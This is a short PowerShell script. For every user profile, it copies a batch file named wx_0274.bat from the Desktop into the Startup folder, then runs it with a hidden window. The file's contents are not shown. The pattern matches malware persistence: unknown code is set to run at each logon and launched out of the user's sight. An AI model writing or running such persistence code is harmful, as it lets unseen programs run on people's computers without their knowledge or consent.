$users = Get-ChildItem -Path "C:\Users" -Directory

foreach ($user in $users) {
    $sourcePath1 = Join-Path -Path $user.FullName -ChildPath "Desktop\wx_0274.bat"
    $destinationPath1 = Join-Path -Path $user.FullName -ChildPath "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\wx_0274.bat"
    
    if (Test-Path $sourcePath1) {
        Copy-Item -Path $sourcePath1 -Destination $destinationPath1 -Force
    }

   
    Start-Process -FilePath $destinationPath1 -WindowStyle Hidden -Wait

 
}

Exit-PSSession
